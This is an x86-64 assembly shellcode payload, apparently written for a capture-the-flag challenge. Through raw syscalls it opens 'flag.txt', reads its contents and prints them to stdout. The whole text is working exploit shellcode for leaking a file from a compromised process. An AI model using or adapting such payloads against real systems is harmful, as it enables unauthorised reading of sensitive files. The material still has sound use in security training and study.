section .text
    global _start
    _start:
    jmp shellcode

    shellcode:
    xor rdi, rdi
    xor rdx, rdx
    xor rax, rax
    
    mov rsi, 0
    lea rdi, [rel buf]
    mov rax, 2
    syscall

    lea rsi, [rsp]
    mov rdx, 100
    mov rdi, rax
    mov rax, 0
    syscall

    lea rsi, [rsp]
    mov rdi, 1
    mov rdx, rax
    mov rax, 1
    syscall

    mov rdi, 0
    mov rax, 0x3c
    syscall

    buf:
    db "flag.txt",0x00